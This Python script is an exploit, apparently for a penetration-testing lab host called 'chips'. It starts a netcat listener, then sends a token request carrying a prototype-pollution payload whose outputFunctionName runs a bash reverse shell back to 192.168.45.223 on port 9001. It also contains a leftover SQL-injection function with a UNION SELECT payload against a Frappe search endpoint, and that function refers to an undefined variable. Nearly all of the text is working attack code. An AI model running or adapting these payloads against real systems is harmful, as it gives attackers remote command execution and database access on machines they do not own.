import urllib3
import requests
import json
import subprocess
import os

s = requests.session()
HOST = "http://chips"
proxies = {
  "http": "http://127.0.0.1:8080"
}
headers = { "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }

#def get_ip_address(interface_name):
 #   addrs = psutil.net_if_addrs()
  #  if interface_name in addrs:
   #     for addr in addrs[interface_name]:
    #        if addr.family == socket.AF_INET:  # AF_INET is for IPv4
     #           if addr.address:
      #              return addr.address
    #print(f"Nie znaleziono adresu IP dla {interface_name}")
    #return None

RHOST = "chips"
RPORT = "80"
#LHOST = get_ip_address("tun0")
LPORT = "9001"

def extract_token(json_string):
    data = json.loads(json_string)
    token = data.get('token')
    return token

def startListener(port):
    try:
        # Uruchomienie listenera netcat w nowym terminalu
        command = f"terminator -e 'nc -nlvp {port}; exec bash'"
        process = subprocess.Popen(command, shell=True)
        print(f"Netcat listener started on port {port} in a new terminal.")
        return process
    except Exception as e:
        print(f"Failed to start netcat listener: {e}")
        return None

def inject(payload):
    data = {"cmd": "frappe.utils.global_search.web_search",
			"text": "text",
			"scope": "text\" UNION ALL SELECT 1,2,3,4,%s#" % payload
	}
    request = s.post(host, data)
    response = request.text
    if request.status_code == 200:
	    return response
    else:
	    print("[!] Error in inject method.")

def generateToken():
    url = f"http://{RHOST}/token"
    data = {
        "connection": {
            "type": "rdp",
            "settings": {
                "hostname": "rdesktop",
                "username": "abc",
                "password": "abc",
                "port": "3389",
                "security": "any",
                "ignore-cert": "true",
                "client-name": "",
                "console": "false",
                "initial-program": "",
                "__proto__": {
                    "outputFunctionName": "x = 1; console.log(process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/192.168.45.223/9001 0>&1\"').toString()); y"
                }
            }
        }
    }

    response = requests.post(url,  json=data)
    token = extract_token(response.text)
    print(token)
    return token

def sendToken(token):
    url = "http://chips/rdp"
    params = {
        "token": f"{token}"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": "http://chips/",
        "Upgrade-Insecure-Requests": "1"
    }

    response = requests.get(url, headers=headers, params=params)
    return response

def sendRequest():
    url = "http://chips"
    response = requests.get(url)
    return response

startListener(LPORT)
token = generateToken()
sendToken(token)
sendRequest()